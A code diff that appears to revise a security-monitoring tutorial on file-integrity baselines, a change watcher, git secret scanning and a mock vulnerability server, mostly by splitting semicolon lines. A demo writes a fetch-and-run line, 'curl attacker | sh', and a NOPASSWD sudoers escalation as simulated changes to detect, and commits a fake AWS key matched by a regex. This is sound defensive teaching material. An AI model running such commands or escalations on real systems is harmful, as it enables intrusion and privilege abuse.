@@ -430,7 +430,7 @@ for p in ["/srv/app/main.py", "/srv/app/__pycache__/main.cpython-312.pyc", "/srv
     print(f"{p:45} {'excluded' if excluded(p, app['path'], app['exclude']) else 'watched'}")
 @note
 `tomllib` parses the policy into dictionaries, and defaults are filled in for optional keys. Exclusion patterns are matched against both the path relative to the watched folder and the bare file name, so `*.pyc` and `logs/*` behave as a reader would expect.
-@example python: Which metadata reveals which kind of change
+@example python varies: Which metadata reveals which kind of change
 import os
 import stat
 import tempfile
@@ -480,7 +480,7 @@ Comparing two scans is set arithmetic on the paths: in the new scan but not the 
 - Record `{"sha256", "size", "mode", "uid", "mtime"}` per path; save JSON sorted by path.
 - Compare: added = new − old, deleted = old − new, changed = fields that differ.
 - Protect the baseline: read-only storage elsewhere, or an HMAC signature checked with `compare_digest`.
-@example python: Scan, save a baseline, change things, compare
+@example python varies: Scan, save a baseline, change things, compare
 import hashlib
 import json
 import stat
@@ -645,12 +645,14 @@ thread = threading.Thread(target=watcher, args=(stop,), daemon=True)
 thread.start()
 time.sleep(0.2)
 for text in ["kev ALL=(ALL) ALL\n", "kev ALL=(ALL) ALL\n"]:      # saved twice, no real change
-    (folder / "sudoers").write_text(text); time.sleep(0.05)
+    (folder / "sudoers").write_text(text)
+    time.sleep(0.05)
 time.sleep(0.5)
 (folder / "sudoers").write_text("kev ALL=(ALL) NOPASSWD: ALL\n")
 (folder / "evil.sh").write_text("curl attacker | sh\n")
 time.sleep(0.8)
-stop.set(); thread.join()
+stop.set()
+thread.join()
 print(sorted(alerts))
 @note
 This stands in for watchdog with simple polling so it runs anywhere, but the logic is the same: changes go into a pending map, are processed after a quiet period, and are compared by hash. Saving the file twice without changing it produced no alert; the real escalation and the new script each produced exactly one.
@@ -887,11 +889,14 @@ def git(*args):
 
 git("init", "-q", "-b", "main")
 (repo / "app.py").write_text('print("hello")\n')
-git("add", "."); git("commit", "-qm", "First commit")
+git("add", ".")
+git("commit", "-qm", "First commit")
 (repo / "settings.py").write_text('DEBUG = False\nAWS_KEY = "AKIAQWERTYUIOPASDFGH"\n')
-git("add", "."); git("commit", "-qm", "Add settings")
+git("add", ".")
+git("commit", "-qm", "Add settings")
 (repo / "settings.py").write_text("DEBUG = False\nimport os\nAWS_KEY = os.environ['AWS_KEY']\n")
-git("add", "."); git("commit", "-qm", "Read key from environment")
+git("add", ".")
+git("commit", "-qm", "Read key from environment")
 
 AWS = re.compile(r"AKIA[0-9A-Z]{16}")
 HUNK = re.compile(r"^@@ -\d+(?:,\d+)? \+(\d+)")
@@ -1016,7 +1021,8 @@ class FakeOSV(BaseHTTPRequestHandler):                 # stands in for https://a
     def do_POST(self):
         q = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
         vulns = ADVISORIES.get((q["package"]["name"], q["version"]), [])
-        self.send_response(200); self.end_headers()
+        self.send_response(200)
+        self.end_headers()
         self.wfile.write(json.dumps({"vulns": vulns} if vulns else {}).encode())
     def log_message(self, *a):
         pass
